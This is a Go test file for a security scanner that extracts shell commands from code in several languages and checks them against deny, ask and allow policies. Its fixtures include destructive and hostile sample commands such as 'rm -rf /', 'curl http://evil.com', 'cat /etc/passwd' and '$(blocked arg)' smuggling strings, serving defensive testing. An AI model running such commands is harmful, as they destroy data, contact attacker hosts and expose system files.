package security

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestExtractShellCommands_Python(t *testing.T) {
	code := `
import os
import subprocess

os.system("rm -rf /tmp")
subprocess.run("curl http://evil.com")
subprocess.check_output("wget http://bad.com")
`
	cmds := ExtractShellCommands(code, "python")
	assert.Contains(t, cmds, "rm -rf /tmp")
	assert.Contains(t, cmds, "curl http://evil.com")
	assert.Contains(t, cmds, "wget http://bad.com")
}

func TestEmbeddedArgvPolicy(t *testing.T) {
	for _, tc := range []struct {
		name, code, pattern string
		denied              bool
	}{
		{"literal paren", `subprocess.run(["printf", "%s", "foo("])`, "Bash(blocked:*)", false},
		{"literal substitution", `subprocess.run(["printf", "%s", "$(blocked arg)"])`, "Bash(blocked:*)", false},
		{"literal separator", `subprocess.run(["printf", "%s", "x; blocked arg"])`, "Bash(blocked:*)", false},
		{"raw argument deny", `subprocess.run(["printf", "%s", "foo(bar)"])`, "Bash(printf %s foo(*))", true},
		{"direct executable deny", `subprocess.run(["blocked", "foo("])`, "Bash(blocked:*)", true},
		{"shell true", `subprocess.run(["echo $(blocked arg)"], shell=True)`, "Bash(blocked:*)", true},
		{"shell true after continuation", "subprocess.run([\"echo $(blocked arg)\"], \\\n    shell=True)", "Bash(blocked:*)", true},
		{"shell continued keyword", "subprocess.run([\"echo $(blocked arg)\"], shell \\\n = True)", "Bash(blocked:*)", true},
		{"shell split keyword", "subprocess.run([\"echo $(blocked arg)\"], sh\\\nell=True)", "Bash(blocked:*)", true},
		{"shell kwargs", `subprocess.run(["echo ok; blocked arg"], **{"shell": True})`, "Bash(blocked:*)", true},
		{"dynamic shell retains raw deny", `subprocess.run(["printf", "%s", "foo(bar)"], shell=enabled)`, "Bash(printf %s foo(*))", true},
		{"shell true after nested kwarg", `subprocess.run(["echo $(blocked arg)"], timeout=int(1), shell=True)`, "Bash(blocked:*)", true},
		{"shell true after quoted paren", `subprocess.run(["echo $(blocked arg)"], cwd="some)dir", shell=True)`, "Bash(blocked:*)", true},
		{"shell dynamic", `subprocess.run(["echo $(blocked arg)"], shell=enabled)`, "Bash(blocked:*)", true},
		{"shell false expression", `subprocess.run(["echo $(blocked arg)"], shell=False or True)`, "Bash(blocked:*)", true},
		{"quoted shell flag", `subprocess.run(["printf", "$(blocked arg)"], cwd="shell=True")`, "Bash(blocked:*)", false},
		{"nested false", `subprocess.run(["printf", "$(blocked arg)"], timeout=int(1), shell=False)`, "Bash(blocked:*)", false},
		{"shell false", `subprocess.run(["printf", "%s", "foo("], shell=False)`, "Bash(blocked:*)", false},
		{"later shell flag", `subprocess.run(["printf", "%s", "$(blocked arg)"]); subprocess.run("echo ok", shell=True)`, "Bash(blocked:*)", false},
		{"explicit shell", `subprocess.run(["bash", "-c", "echo ok; blocked arg"])`, "Bash(blocked:*)", true},
		{"shell login flags", `subprocess.run(["/bin/sh", "-lc", "echo $(blocked arg)"])`, "Bash(blocked:*)", true},
		{"shell long option", `subprocess.run(["bash", "--norc", "-c", "echo ok; blocked arg"])`, "Bash(blocked:*)", true},
		{"shell option value", `subprocess.run(["bash", "-o", "pipefail", "-c", "echo ok; blocked arg"])`, "Bash(blocked:*)", true},
		{"env shell", `subprocess.run(["env", "FOO=bar", "bash", "-c", "blocked arg"])`, "Bash(blocked:*)", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			commands := ExtractEmbeddedCommands(tc.code, "python")
			require.NotEmpty(t, commands)
			for _, evaluate := range []func(EmbeddedCommand, []SecurityPolicy) (CommandDecision, error){EvaluateEmbeddedCommand, EvaluateEmbeddedCommandDenyOnly} {
				denied := false
				for _, command := range commands {
					decision, err := evaluate(command, []SecurityPolicy{{Deny: []string{tc.pattern}}})
					require.NoError(t, err)
					denied = denied || decision.Decision == "deny"
				}
				assert.Equal(t, tc.denied, denied)
			}
		})
	}
	commands := ExtractEmbeddedCommands(`subprocess.run(["printf", "%s", "foo(bar)"])`, "python")
	for _, action := range []string{"ask", "allow"} {
		policy := SecurityPolicy{}
		if action == "ask" {
			policy.Ask = []string{"Bash(printf %s foo(*))"}
		} else {
			policy.Allow = []string{"Bash(printf %s foo(*))"}
		}
		decision, err := EvaluateEmbeddedCommand(commands[0], []SecurityPolicy{policy})
		require.NoError(t, err)
		assert.Equal(t, action, decision.Decision)
		assert.NotEmpty(t, decision.MatchedPattern)
	}
	commands = ExtractEmbeddedCommands(`subprocess.run(["printf", "`+strings.Repeat("x", MaxShellInputBytes)+`"])`, "python")
	_, err := EvaluateEmbeddedCommandDenyOnly(commands[0], nil)
	var limit *ShellScanLimitError
	require.ErrorAs(t, err, &limit)
}

func TestExtractShellCommands_PythonListForm(t *testing.T) {
	code := `subprocess.run(["rm", "-rf", "/"])`
	cmds := ExtractShellCommands(code, "python")
	assert.Contains(t, cmds, "rm -rf /")
}

func TestExtractShellCommands_JavaScript(t *testing.T) {
	code := `
const { execSync } = require('child_process');
execSync("npm install malware");
spawn("curl", ["http://evil.com"]);
`
	cmds := ExtractShellCommands(code, "javascript")
	assert.Contains(t, cmds, "npm install malware")
	assert.Contains(t, cmds, "curl")
}

func TestExtractShellCommands_TypeScript(t *testing.T) {
	code := `execSync("ls -la")`
	cmds := ExtractShellCommands(code, "typescript")
	assert.Contains(t, cmds, "ls -la")
}

func TestExtractShellCommands_Ruby(t *testing.T) {
	code := "system(\"rm -rf /\")\nresult = `whoami`"
	cmds := ExtractShellCommands(code, "ruby")
	assert.Contains(t, cmds, "rm -rf /")
	assert.Contains(t, cmds, "whoami")
}

func TestExtractShellCommands_Go(t *testing.T) {
	code := `exec.Command("rm", "-rf", "/")`
	cmds := ExtractShellCommands(code, "go")
	assert.Contains(t, cmds, "rm")
}

func TestExtractShellCommands_PHP(t *testing.T) {
	code := `
shell_exec("rm -rf /");
exec("whoami");
system("ls");
passthru("cat /etc/passwd");
proc_open("sh -c 'evil'");
`
	cmds := ExtractShellCommands(code, "php")
	assert.Contains(t, cmds, "rm -rf /")
	assert.Contains(t, cmds, "whoami")
	assert.Contains(t, cmds, "ls")
	assert.Contains(t, cmds, "cat /etc/passwd")
	assert.Contains(t, cmds, "sh -c 'evil'")
}

func TestExtractShellCommands_Rust(t *testing.T) {
	code := `Command::new("rm")`
	cmds := ExtractShellCommands(code, "rust")
	assert.Contains(t, cmds, "rm")
}

func TestExtractShellCommands_UnknownLanguage(t *testing.T) {
	cmds := ExtractShellCommands("anything", "haskell")
	assert.Nil(t, cmds)
}

func TestExtractShellCommands_NoMatches(t *testing.T) {
	cmds := ExtractShellCommands("print('hello')", "python")
	assert.Empty(t, cmds)
}
